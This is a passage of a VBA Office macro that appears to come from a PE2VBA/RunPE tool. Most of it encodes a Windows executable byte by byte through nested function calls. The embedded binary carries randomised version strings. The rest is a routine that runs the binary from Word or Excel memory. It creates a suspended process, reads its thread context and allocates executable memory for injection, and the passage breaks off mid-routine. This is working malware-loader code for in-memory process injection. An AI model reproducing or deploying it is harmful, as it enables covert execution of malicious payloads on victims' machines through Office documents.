    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 240), 27), "@"), 0), 0), 0), 0), 0), 192), 27), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 16), 0), 0), 0), 24), 0), 0), 128), 0), 0), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 1), 0), 0), 0), "0"), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 9), 4), 0), 0), "H"), 0), 0), 0), "X"), 16), 1), 0), 180), 2)
    strPE = A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 180), 2), "4"), 0), 0), 0), "V"), 0), "S"), 0), "_"), 0), "V"), 0), "E"), 0), "R"), 0), "S"), 0), "I"), 0), "O"), 0), "N"), 0), "_"), 0), "I"), 0), "N"), 0), "F"), 0), "O"), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 189), 4), 239), 254), 0), 0), 1), 0), 160), "fk"), 133), 0), 0), 0), 0), "B"), 139), 209), "&"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE16 = strPE
End Function

Private Function PE17() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 0), 0), 18), 2), 0), 0), 1), 0), "S"), 0), "t"), 0), "r"), 0), "i"), 0), "n"), 0), "g"), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "I"), 0), "n"), 0), "f"), 0), "o"), 0), 0), 0), 238), 1), 0), 0), 1), 0), "0"), 0), "8"), 0), "0"), 0)
    strPE = A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "9"), 0), "0"), 0), "4"), 0), "E"), 0), "4"), 0), 0), 0), "4"), 0), 10), 0), 1), 0), "C"), 0), "o"), 0), "m"), 0), "p"), 0), "a"), 0), "n"), 0), "y"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), 0), 0), "p"), 0), "X"), 0), "v"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "s"), 0), "l"), 0), "W"), 0), "N"), 0), "r"), 0), "u"), 0), 0), 0), ">"), 0), 11), 0), 1), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "D"), 0), "e"), 0), "s"), 0), "c"), 0), "r"), 0), "i"), 0), "p"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "q"), 0), "r"), 0), "C"), 0), "U"), 0), "G"), 0), "a"), 0), "j"), 0), "z"), 0), "p"), 0), "s"), 0), 0), 0), 0), 0), "@"), 0), 16), 0), 1), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0)
    strPE = A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(strPE, "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), "9"), 0), "4"), 0), "6"), 0), "4"), 0), "2"), 0), "2"), 0), "6"), 0), "."), 0), "1"), 0), "4"), 0), "6"), 0), "3"), 0), "5"), 0), "9"), 0), "7"), 0), 0), 0), "8"), 0), 12), 0), 1), 0), "I"), 0)
    strPE = A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), "t"), 0), "e"), 0), "r"), 0), "n"), 0), "a"), 0), "l"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), "Q"), 0), "e"), 0), "l"), 0), "s"), 0), "Q"), 0), "i"), 0), "t"), 0), "F"), 0), "g"), 0), "L"), 0), "T"), 0), 0), 0), "8"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 10), 0), 1), 0), "L"), 0), "e"), 0), "g"), 0), "a"), 0), "l"), 0), "C"), 0), "o"), 0), "p"), 0), "y"), 0), "r"), 0), "i"), 0), "g"), 0), "h"), 0), "t"), 0), 0), 0), "y"), 0), "v"), 0), "q"), 0), "R"), 0), "y"), 0), "Q"), 0), "n"), 0), "w"), 0)
    strPE = A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "T"), 0), 0), 0), "<"), 0), 10), 0), 1), 0), "O"), 0), "r"), 0), "i"), 0), "g"), 0), "i"), 0), "n"), 0), "a"), 0), "l"), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "n"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), "Q"), 0), "W"), 0), "O"), 0)
    strPE = A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "w"), 0), "o"), 0), "s"), 0), "r"), 0), "Z"), 0), "S"), 0), 0), 0), "2"), 0), 9), 0), 1), 0), "P"), 0), "r"), 0), "o"), 0), "d"), 0), "u"), 0), "c"), 0), "t"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), 0), 0), "a"), 0), "T"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "y"), 0), "M"), 0), "G"), 0), "e"), 0), "U"), 0), "F"), 0), 0), 0), 0), 0), "B"), 0), 15), 0), 1), 0), "P"), 0), "r"), 0), "o"), 0), "d"), 0), "u"), 0), "c"), 0), "t"), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 0), 0), "3"), 0), "8"), 0), "4"), 0), "2"), 0), "5"), 0), "6"), 0), "."), 0), "5"), 0), "1"), 0), "1"), 0), "3"), 0), "0"), 0), "8"), 0), "8"), 0), 0), 0), 0), 0), "D"), 0), 0), 0), 1), 0), "V"), 0), "a"), 0), "r"), 0), "F"), 0), "i"), 0)
    strPE = A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "l"), 0), "e"), 0), "I"), 0), "n"), 0), "f"), 0), "o"), 0), 0), 0), 0), 0), "$"), 0), 4), 0), 0), 0), "T"), 0), "r"), 0), "a"), 0), "n"), 0), "s"), 0), "l"), 0), "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), 9), 8)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 228), 4), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE17 = strPE
End Function

Private Function PE() As String
    Dim strPE As String
    strPE = ""
    strPE = strPE + PE0()
    strPE = strPE + PE1()
    strPE = strPE + PE2()
    strPE = strPE + PE3()
    strPE = strPE + PE4()
    strPE = strPE + PE5()
    strPE = strPE + PE6()
    strPE = strPE + PE7()
    strPE = strPE + PE8()
    strPE = strPE + PE9()
    strPE = strPE + PE10()
    strPE = strPE + PE11()
    strPE = strPE + PE12()
    strPE = strPE + PE13()
    strPE = strPE + PE14()
    strPE = strPE + PE15()
    strPE = strPE + PE16()
    strPE = strPE + PE17()
    PE = strPE
End Function
' ===== END PE2VBA =====


' ================================================================================
'                                   ~~~ MAIN ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    RunPE
' Desc:      Main method. Executes a PE from the memory of Word/Excel
' Arguments: baImage - A Byte array representing a PE file
'            strArguments - A String representing the command line arguments
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)

    Debug.Print ("[*] Checking source PE...")
    ' Populate IMAGE_DOS_HEADER structure
    ' |__ IMAGE_DOS_HEADER size is 64 (0x40)
    Dim structDOSHeader As IMAGE_DOS_HEADER
    Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), SIZEOF_IMAGE_DOS_HEADER)
    
    
    ' Check Magic Number (i.e. is it a PE file?)
    ' |__ Magic number = 0x5A4D or 23117 or 'MZ'
    If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ Magic number is OK.")
        End If
    Else
        Debug.Print ("    |__ Input file is not a valid PE.")
        Exit Sub
    End If
    
    
    ' Populate IMAGE_NT_HEADERS structure
    ' |__ IMAGE_NT_HEADERS start at offset DOSHeader->e_lfanew
    ' |__ IMAGE_NT_HEADERS size is 248 (0xf8) (32 bits)
    ' |__ IMAGE_NT_HEADERS size is 264 (0x108) (64 bits)
    Dim structNTHeaders As IMAGE_NT_HEADERS
    Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
    Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
    
    
    ' Check NT headers Signature
    ' |__ NT Header Signature = 'PE00' or 0x00004550 or 17744
    If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
        If VERBOSE Then
            Debug.Print ("    |__ NT Header Signature is OK.")
        End If
    Else
        Debug.Print ("    |__ NT Header Signature is not valid.")
        Exit Sub
    End If
    
    
    ' Check CPU architecture
    If VERBOSE Then
        Debug.Print ("    |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
    End If
    #If Win64 Then
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
            Debug.Print ("[-] You're trying to inject a 32 bits binary into a 64 bits process!")
            Exit Sub
        End If
    #Else
        If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64 Then
            Debug.Print ("[-] You're trying to inject a 64 bits binary into a 32 bits process!")
            Exit Sub
        End If
    #End If
    
    
    ' Get the path of the current process executable
    Dim strCurrentFilePath As String
    strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
    Dim lGetModuleFileName As Long
    lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
    strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
    
    
    ' Format command line
    Dim strCmdLine As String
    strCmdLine = strCurrentFilePath + " " + strArguments
    
    
    ' Create new process in suspended state
    Debug.Print ("[*] Creating new process in suspended state...")
    Dim strNull As String
    Dim structProcessInformation As PROCESS_INFORMATION
    Dim structStartupInfo As STARTUPINFO
    If VERBOSE Then
        Debug.Print ("    |__ Target PE: '" + strCurrentFilePath + "'")
    End If
    Dim lCreateProcess As Long
    lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
    If lCreateProcess = 0 Then
        Debug.Print ("    |__ CreateProcess() failed (Err: " + Str(Err.LastDllError) + ").")
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ CreateProcess() OK")
        End If
    End If
    
    
    ' Get Thread Context
    Debug.Print ("[*] Retrieving the context of the main thread...")
    Dim structContext As CONTEXT
    structContext.ContextFlags = CONTEXT_INTEGER 'CONTEXT_FULL
    Dim lGetThreadContext As Long
    #If Win64 Then
        Dim baContext(0 To (LenB(structContext) - 1)) As Byte
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lGetThreadContext = 0 Then
        Debug.Print ("    |__ GetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        #If Win64 Then
            Call RtlMoveMemory(VarPtr(structContext), VarPtr(baContext(0)), LenB(structContext))
        #End If
        If VERBOSE Then
            Debug.Print ("    |__ GetThreadContext() OK")
        End If
    End If
    
    
    ' Get image base of the target process (if we want to unmap it before injecting our PE)
    ' |__ Image base address is CONTEXT.ebx + 8 (32 bits)
    ' |__ Image base address is CONTEXT.rdx + 16 (64 bits)
    'Debug.Print ("[*] Reading target process base image address...")
    'Dim ptrTargetImageBase As LongPtr
    'Dim ptrTargetImageBaseLocation As LongPtr
    '#If Win64 Then
    '    ptrTargetImageBaseLocation = structContext.Rdx + 16
    '#Else
    '    ptrTargetImageBaseLocation = structContext.Ebx + 8
    '#End If
    
    'Dim lReadProcessMemory As Long
    'lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, ptrTargetImageBaseLocation, VarPtr(ptrTargetImageBase), SIZEOF_ADDRESS, 0)
    'If lReadProcessMemory = 0 Then
    '    Debug.Print ("    |__ ReadProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
    '    Call TerminateProcess(structProcessInformation.hProcess, 0)
    '    Exit Sub
    'Else
    '    If VERBOSE Then
    '        Debug.Print ("    |__ Target process image base address: Ox" + Hex(ptrTargetImageBase))
    '    End If
    'End If
    
    
    ' Unmap target image (optional)
    ' We don't really need to unmap the current image
    
    
    ' Get Relocation directory and check if the PE has a relocation table
    ' |__ NTHeaders.OptionalHeader.DataDirectory[5]
    Dim structRelocDirectory As IMAGE_DATA_DIRECTORY
    Call RtlMoveMemory(VarPtr(structRelocDirectory), VarPtr(structNTHeaders.OptionalHeader.DataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC)), SIZEOF_IMAGE_DATA_DIRECTORY)
    
    Dim ptrDesiredImageBase As LongPtr: ptrDesiredImageBase = 0
    If structRelocDirectory.VirtualAddress = 0 Then
        Debug.Print ("[!] PE has no relocation table, using default base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
        ptrDesiredImageBase = structNTHeaders.OptionalHeader.ImageBase
    End If
    

    ' Allocate memory for the source image in the new process
    Debug.Print ("[*] Allocating memory for the source image in process with PID" + Str(structProcessInformation.dwProcessId) + "...")
    If VERBOSE Then
        Debug.Print ("    |__ PE image size: " + Str(structNTHeaders.OptionalHeader.SizeOfImage))
    End If
    Dim ptrProcessImageBase As LongPtr
    ptrProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, ptrDesiredImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrProcessImageBase = 0 Then
        Debug.Print ("    |__ VirtualAllocEx() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ VirtualAllocEx() OK - Got Addr: 0x" + Hex(ptrProcessImageBase))
        End If
    End If
    
    
    ' Change the image base saved in headers
    ' |__ IMAGE_NT_HEADERS is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew
    ' |__ IMAGE_NT_HEADERS = Signature || IMAGE_FILE_HEADER || IMAGE_OPTIONAL_HEADER
    ' |__ In IMAGE_OPTIONAL_HEADER32, ImageBase is at offset 28
